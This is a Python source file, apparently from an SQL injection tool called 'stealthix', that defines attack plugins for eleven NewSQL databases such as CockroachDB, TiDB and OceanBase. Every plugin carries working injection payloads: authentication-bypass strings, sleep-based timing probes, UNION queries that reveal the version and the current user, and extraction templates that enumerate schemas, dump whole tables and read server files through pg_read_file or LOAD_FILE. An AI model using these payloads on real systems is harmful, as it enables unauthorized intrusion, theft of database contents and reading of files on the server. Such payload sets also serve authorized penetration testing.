from __future__ import annotations

from stealthix.plugins.base import Plugin

NEWSQL_PLUGINS = [
    Plugin(
        "cockroachdb",
        "newsql",
        dbms="cockroachdb",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["cockroach"],
        error_signatures=["cockroach"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--", "' UNION SELECT session_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "tidb",
        "newsql",
        dbms="tidb",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["tidb"],
        error_signatures=["tidb"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "yugabytedb",
        "newsql",
        dbms="yugabytedb",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["yugabyte"],
        error_signatures=["yugabyte"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT current_database()--"],
        privilege_checks=["' UNION SELECT current_user--", "' UNION SELECT session_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT tablename FROM pg_tables--"],
                "patterns": [r"tablename[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "spanner",
        "newsql",
        dbms="spanner",
        payloads=["' OR '1'='1", "'; SELECT 1 WHERE 1=1-- "],
        fingerprints=["spanner"],
        error_signatures=["spanner", "google"],
        version_queries=[
            "SELECT @@version",
            "SELECT database_name FROM information_schema.databases",
        ],
        privilege_checks=["SELECT current_user", "SELECT session_user"],
        os_queries=["SELECT @@version"],
        preferred_techniques="B",
        extraction_profiles={
            "databases": {
                "payloads": ["SELECT database_name FROM information_schema.databases"],
                "patterns": [r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["SELECT table_name FROM information_schema.tables"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["SELECT column_name FROM information_schema.columns"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "dump": {"payloads": ["SELECT {columns} FROM {table}"]},
        },
    ),
    Plugin(
        "voltdb",
        "newsql",
        dbms="voltdb",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["volt"],
        error_signatures=["volt", "voltdb"],
        version_queries=[
            "SELECT @@version",
            "SELECT database_name FROM information_schema.databases",
        ],
        privilege_checks=["SELECT current_user", "SELECT session_user"],
        os_queries=["SELECT @@version"],
        preferred_techniques="B",
        extraction_profiles={
            "databases": {
                "payloads": ["SELECT schema_name FROM information_schema.schemata"],
                "patterns": [r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["SELECT table_name FROM information_schema.tables"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["SELECT column_name FROM information_schema.columns"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "dump": {"payloads": ["SELECT {columns} FROM {table} LIMIT 1000"]},
        },
    ),
    Plugin(
        "nuodb",
        "newsql",
        dbms="nuodb",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["nuodb"],
        error_signatures=["nuodb"],
        version_queries=["SELECT @@version", "SELECT schema_name FROM information_schema.schemata"],
        privilege_checks=["SELECT current_user", "SELECT session_user"],
        os_queries=["SELECT @@version"],
        preferred_techniques="B",
        extraction_profiles={
            "databases": {
                "payloads": ["SELECT schema_name FROM information_schema.schemata"],
                "patterns": [r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["SELECT table_name FROM information_schema.tables"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["SELECT column_name FROM information_schema.columns"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "dump": {"payloads": ["SELECT {columns} FROM {table} LIMIT 1000"]},
        },
    ),
    Plugin(
        "singlestore",
        "newsql",
        dbms="singlestore",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["singlestore", "memsql"],
        error_signatures=["singlestore", "memsql"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table} LIMIT 1000--"]},
        },
    ),
    Plugin(
        "oceanbase",
        "newsql",
        dbms="oceanbase",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["oceanbase"],
        error_signatures=["oceanbase"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table} LIMIT 1000--"]},
        },
    ),
    Plugin(
        "polardb",
        "newsql",
        dbms="polardb",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["polardb"],
        error_signatures=["polardb"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table} LIMIT 1000--"]},
        },
    ),
    Plugin(
        "tiflash",
        "newsql",
        dbms="tiflash",
        payloads=["' OR '1'='1", "' OR SLEEP(3)-- "],
        fingerprints=["tiflash"],
        error_signatures=["tiflash"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT user()--", "' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version_compile_os--"],
        preferred_techniques="BEUT",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"schema[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)", r"table[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)", r"column[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT LOAD_FILE('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table} LIMIT 1000--"]},
        },
    ),
    Plugin(
        "yugabyte_ycql",
        "newsql",
        dbms="yugabyte_ycql",
        payloads=["' OR '1'='1", "'; ALLOW FILTERING"],
        fingerprints=["ycql", "yugabyte"],
        error_signatures=["ycql", "cassandra"],
        version_queries=["SELECT release_version FROM system.local"],
        privilege_checks=["SELECT role FROM system.roles"],
        os_queries=["SELECT release_version FROM system.local"],
        preferred_techniques="B",
        extraction_profiles={
            "databases": {
                "payloads": ["SELECT keyspace_name FROM system_schema.keyspaces"],
                "patterns": [r"keyspace_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["SELECT table_name FROM system_schema.tables"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["SELECT column_name FROM system_schema.columns"],
                "patterns": [r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "dump": {"payloads": ["SELECT {columns} FROM {table} LIMIT 1000"]},
        },
    ),
]
